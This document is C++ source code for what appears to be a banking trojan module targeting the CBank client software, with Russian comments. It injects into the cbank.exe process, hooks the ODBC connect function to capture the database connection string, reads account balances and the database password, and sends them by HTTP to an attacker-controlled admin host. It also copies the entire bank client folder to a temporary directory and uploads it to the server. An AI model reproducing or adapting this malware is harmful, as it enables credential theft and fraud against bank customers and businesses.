#include "BBSCBank.h"
//#include <windows.h>
//#include <wininet.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <sqlext.h>

#include "GetApi.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Memory.h"
#include "Strings.h"
#include "VideoRecorder.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "odbc.h"
#include "Config.h"
#include "rafa.h"
#include "AzConfig.h"
#include "BotDebug.h"

namespace BBS_CALC
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define DBG BBS_CALC::DBGOutMessage<>


namespace CBank
{

static DWORD WINAPI SendCBank( void* param ); //отсылка файлов CBank на сервер

SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
     SQLHDBC         ConnectionHandle,
     SQLHWND         WindowHandle,
     SQLCHAR *       InConnectionString,
     SQLSMALLINT     StringLength1,
     SQLCHAR *       OutConnectionString,
     SQLSMALLINT     BufferLength,
     SQLSMALLINT *   StringLength2Ptr,
     SQLUSMALLINT    DriverCompletion);

SQLRETURN (WINAPI *pHandlerSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
SQLRETURN (WINAPI *pHandlerSQLExecDirectA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
SQLRETURN (WINAPI *pHandlerSQLExecute)( SQLHSTMT StatementHandle );

//извлекает подстроку между символами c, номер подстроки указывается в num
static char* GetPieceString( const char* s, char c, int num, char* to, int c_to );

static char strODBCConnect[MAX_PATH];
static char domain[128];

////////////////////////////////////////////////////////
// функции управления базой данных
//////////////////////////////////////////////////////////
static void CloseDB( ODBC* DB )
{
	if( DB ) delete DB;
}

static ODBC* CreateDB()
{
	ODBC* DB = new ODBC();
	if( DB )
		if( !DB->Connect(strODBCConnect) )
		{
			CloseDB(DB);
			DB = 0;
		}
	return DB;
}

static char* GetAdminUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, "rus.zika.in" );
#else
//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

/////////////////////////////////////////////////////////////////////
// Хуки
/////////////////////////////////////////////////////////////////////

static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString,
					      SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength,
						  SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion )
{
	if( strODBCConnect[0] == 0 )
	{
		m_lstrcpy( strODBCConnect, (char*)InConnectionString );
		DBG( "CBank", "StringConnect='%s'", InConnectionString );
	}
	return pHandlerSQLDriverConnectA( ConnectionHandle, WindowHandle, InConnectionString, StringLength1,
						  OutConnectionString, BufferLength, StringLength2Ptr, DriverCompletion );
}

static bool SetHooks()
{
	if( !HookApi( DLL_ODBC32, 0x3941DBB7, HandlerSQLDriverConnectA, &pHandlerSQLDriverConnectA ) ) return false;
	return true;
}

static bool InitData()
{
	strODBCConnect[0] = 0;
	if( GetAdminUrl(domain) == 0 )
		domain[0] = 0;
	return true;
}

//грабит баланс и отправляет в админку
static DWORD WINAPI GrabAndSendBalance(void*)
{
	DBG( "CBank", "Ждем строки подключения к базе" );
	while( strODBCConnect[0] == 0 ) pSleep(1000);
	pSleep(5000); //после получения строки немного подождем на всякий случай
	ODBC* DB = CreateDB();
	if( DB )
	{
		const char* sql = "select Rest,Account from Account";
		const char* format = "os31 os31";
		char Rest[32], Account[32];
		SQLHSTMT qr = DB->ExecuteSql( sql, format, Rest, Account );
		if( qr )
		{
			DBG( "CBank", "Rest=%s, Account=%s", Rest, Account );
			DB->CloseQuery(qr);
			//извлекаем пароль
			char pwd[64]; pwd[0] = 0;
			char* p = m_strstr( strODBCConnect, "PWD=" );
			if( p )
			{
				p += 4; //переходим на сам пароль
				char* p2 = p;
				while( *p2 && *p2 != ';' ) p2++; //ищем конец пароля
				int len = p2 - p;
				m_memcpy( pwd, p, len );
				pwd[len] = 0;
			}
			DBG( "CBank", "Пароль='%s'", pwd );
			fwsprintfA pwsprintfA = Get_wsprintfA();
			MemPtr<512> qr;
			string user = GetAzUser();
			pwsprintfA( qr.str(), "http://%s/set/bal.html?uid=%s&type=bss&sum=%s&acc=%s&pass=%s&cid=%s", domain, BOT_UID, Rest, Account, pwd, user.t_str() );
			DBG( "CBank", "Отсылаем запрос %s", qr.str() );
			THTTPResponseRec Response;
			ClearStruct(Response);
			HTTP::Get( qr, 0, &Response );
			HTTPResponse::Clear(&Response);
		}
		else
			DBG( "CBank", "Запрос не выполнился" );
		CloseDB(DB);
	}
	else
		DBG( "CBank", "Не удалось подключиться к базе" );
	return 0;
}

//поток исполняющийся внутри cbank.exe (cbmain.ex)
static DWORD WINAPI WorkInCBank(void*)
{
	BOT::Initialize(ProcessUnknown);
	if( !InitData() ) return 0;
	char folderCBank[MAX_PATH];
	pGetModuleFileNameA( 0, folderCBank, sizeof(folderCBank) );
	DBG( "CBank", "Заинжектились в процесс '%s'", folderCBank );
	SetHooks();
	StartThread( GrabAndSendBalance, 0 );
	return 0;
}

static DWORD IsRunBClient( char* path )
{
	HANDLE snap = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);
	pProcess32FirstW( snap, &pe );
	DWORD ret = 0;
	do
	{
		DWORD dwProcessHash = GetNameHash(pe.szExeFile);
		if ( dwProcessHash == 0xFE0E05F6 ) //cbmain.ex -> cbank.exe
		{
			if( path[0] == 0 ) 
			{
				HANDLE hProc = pOpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID );
				if (hProc)
				{
					pGetModuleFileNameExA( hProc, 0, path, MAX_PATH );
					pCloseHandle(hProc);
				}
			}
			ret = pe.th32ProcessID;
			break;
		}
	} while( pProcess32NextW( snap, &pe ) );
	pCloseHandle(snap);
	return ret;
}

//поток ждет запуска cbank.exe (через rootkit не ловится)
static void WINAPI WaitRunCBank(void*)
{
	DBG( "СBank", "WaitRunCBank" );
	DWORD idCBank = 0;
	char path[MAX_PATH];
	path[0] = 0;
	while(true)
	{
		DWORD id = IsRunBClient(path);
		if( idCBank == 0 )
		{
			if( id )
			{
				DBG( "CBank", "Start '%s'", path );
				idCBank = id;
				InjectIntoProcess( id, WorkInCBank );
				char* path2 = STR::New(path); 
				RunThread( SendCBank, path2 );
			}
		}
		else
			if( id == 0 )
			{
				idCBank = 0;
				path[0] = 0;
			}
		pSleep( 4 * 1000 );
	}
}

void Start()
{
	StartThread( WaitRunCBank, 0 );
}

static DWORD WINAPI SendCBank( void* param )
{
	char folderCBank[MAX_PATH];
	m_lstrcpy( folderCBank, (char*)param );
	STR::Free((char*)param);
	//в param передается путь к ехе клиента, папка клиента на два уровня выше 
	pPathRemoveFileSpecA(folderCBank);
	pPathRemoveFileSpecA(folderCBank);
	const char* CBankFlagCopy = "cbank_copy.txt";
	if( Bot->FileExists( 0, CBankFlagCopy ) )
	{
		DBG( "CBank", "Клиент уже был скопирован" );
		return 0;
	}
	DWORD folderSize = 0;
	if( !SizeFolderLess( CBankFlagCopy, 1024*1024*250, &folderSize ) )
	{
		DBG( "CBank", "Папка программы больше заданного размера, не копируем" );
		return 0;
	}
	DBG( "CBank", "запуск отсылки программы на сервер из папки %s", folderCBank );

//	DBG( "IFobs", "Размер папки %d байт", folderSize );
	char tempFolder[MAX_PATH];
	const char* clientPrg = "CBankClient";
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	char* cryptName = UIDCrypt::CryptFileName( clientPrg, false );
	pPathAppendA( tempFolder, cryptName );
	STR::Free(cryptName);
	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
	{
		DBG( "CBank", "Эта папка на данный момент выкачивается" );
		return 0;
	}
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "CBank", "Копирование во временную папку %s", tempFolder );
	*((int*)&(folderCBank[ m_lstrlen(folderCBank) ])) = 0; 
	CopyFileANdFolder( folderCBank, tempFolder );
	DBG( "CBank", "Копирование на сервер" );
	//удаляем ненужные папки
	const char* DelFolders[] = { 0 };
	int i = 0;
	while( DelFolders[i] )
	{
		pPathAppendA( tempFolder, DelFolders[i] );
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		DBG( "CBank", "Удаление папки %s", tempFolder );
		DeleteFolders(tempFolder);
		pPathRemoveFileSpecA(tempFolder);
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		i++;
	}
	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
	DeleteFolders(tempFolder);
	Bot->CreateFileA( 0, CBankFlagCopy );
	DBG( "CBank", "Копирование на сервер окончено" );
	return 0;
}

////////////////////////////////////////////////////////////////////
//Разные вспомогательные функции
////////////////////////////////////////////////////////////////////

//извлекает подстроку между символами c, номер подстроки указывается в num
static char* GetPieceString( const char* s, char c, int num, char* to, int c_to )
{
	*to = 0;
	if( num < 0 ) return 0;
	int n = 0;
	char* ret = 0;
	for(;;)
	{
		const char* ps = s;
		while( *ps != 0 && *ps != c ) ps++;
		if( n == num || *ps == 0 )
		{
			int len = ps - s;
			if( len >= c_to ) len = c_to - 1;
			ret = to;
			while( len-- > 0 ) *to++ = *s++;
			*to = 0;
			break;
		}
		s = ps + 1;
		n++;
	}
	return ret;
}


}

